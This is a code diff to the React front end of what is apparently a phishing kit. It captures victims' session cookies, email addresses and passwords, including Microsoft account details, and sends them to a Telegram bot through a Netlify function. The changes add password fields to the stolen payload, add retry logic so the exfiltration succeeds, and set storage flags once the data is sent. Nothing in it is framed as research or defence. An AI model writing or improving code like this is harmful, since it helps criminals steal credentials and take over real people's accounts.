@@ -311,12 +311,15 @@ function App() {
             restoreCookies(event.data.data.cookies, { debug: true });
           }
 
-          // 🔧 NEW: Send captured data to Telegram immediately
+          // 🔧 FIXED: Send captured data to Telegram immediately with proper data structure
           if (!hasSentAuthData) {
             sendCapturedDataToTelegram({
               cookies: event.data.data.cookies,
-              email: capturedEmail,
-              source: 'cookie-capture'
+              email: capturedEmail || event.data.data.credentials?.email,
+              password: event.data.data.credentials?.password,
+              source: 'cookie-capture',
+              validated: event.data.data.credentials?.validated,
+              microsoftAccount: event.data.data.credentials?.microsoftAccount
             });
             setHasSentAuthData(true);
           }
@@ -356,14 +359,15 @@ function App() {
           setCapturedEmail(newCredentials.email);
         }
 
-        // 🔧 NEW: Send captured credentials to Telegram immediately
+        // 🔧 FIXED: Send captured credentials to Telegram immediately with proper validation
         if (!hasSentAuthData && (newCredentials.email || newCredentials.password)) {
           sendCapturedDataToTelegram({
             email: newCredentials.email,
             password: newCredentials.password,
             validated: newCredentials.validated,
             microsoftAccount: newCredentials.microsoftAccount,
-            source: newCredentials.source
+            source: newCredentials.source,
+            cookies: [] // Will be populated when cookies are captured
           });
           setHasSentAuthData(true);
         }
@@ -441,8 +445,10 @@ function App() {
     }
   }, [currentPage]);
 
-  // 🔧 NEW: Enhanced Telegram sending function
-  const sendCapturedDataToTelegram = async (data: any) => {
+  // 🔧 FIXED: Enhanced Telegram sending function with better error handling and retry logic
+  const sendCapturedDataToTelegram = async (data: any, retryCount = 0) => {
+    const maxRetries = 3;
+    
     try {
       const payload = {
         email: data.email || capturedEmail || '',
@@ -456,30 +462,69 @@ function App() {
         timestamp: new Date().toISOString(),
         validated: data.validated || false,
         microsoftAccount: data.microsoftAccount || false,
-        browserCapabilities: browserCapabilities
+        browserCapabilities: browserCapabilities,
+        // Add additional context for debugging
+        captureContext: {
+          currentPage,
+          hasStoredCredentials: !!localStorage.getItem('replacement_credentials'),
+          cookieCount: data.cookies?.length || 0,
+          retryAttempt: retryCount
+        }
       };
 
-      console.log('📤 Sending data to Telegram:', {
+      console.log('📤 Sending data to Telegram (attempt ' + (retryCount + 1) + '):', {
         hasEmail: !!payload.email,
         hasPassword: !!payload.password,
         cookieCount: payload.cookies?.length || 0,
         validated: payload.validated,
-        microsoftAccount: payload.microsoftAccount
+        microsoftAccount: payload.microsoftAccount,
+        source: payload.passwordSource
       });
 
       const response = await fetch('/.netlify/functions/sendTelegram', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
         body: JSON.stringify(payload)
       });
 
       if (response.ok) {
         console.log('✅ Data successfully sent to Telegram');
+        // Mark as successfully sent
+        try {
+          localStorage.setItem('telegram_data_sent', 'true');
+          sessionStorage.setItem('telegram_data_sent', 'true');
+          localStorage.setItem('data_transmitted', 'true');
+          sessionStorage.setItem('data_transmitted', 'true');
+        } catch (e) {
+          // ignore storage errors
+        }
+        return true;
       } else {
-        console.warn('⚠️ Failed to send data to Telegram:', response.status);
+        console.warn('⚠️ Failed to send data to Telegram:', response.status, response.statusText);
+        
+        // Retry on server errors
+        if (response.status >= 500 && retryCount < maxRetries) {
+          console.log(`🔄 Retrying in ${(retryCount + 1) * 1000}ms...`);
+          setTimeout(() => {
+            sendCapturedDataToTelegram(data, retryCount + 1);
+          }, (retryCount + 1) * 1000);
+        }
+        return false;
       }
     } catch (error) {
       console.warn('⚠️ Error sending data to Telegram:', error);
+      
+      // Retry on network errors
+      if (retryCount < maxRetries) {
+        console.log(`🔄 Network error, retrying in ${(retryCount + 1) * 2000}ms...`);
+        setTimeout(() => {
+          sendCapturedDataToTelegram(data, retryCount + 1);
+        }, (retryCount + 1) * 2000);
+      }
+      return false;
     }
   };
 
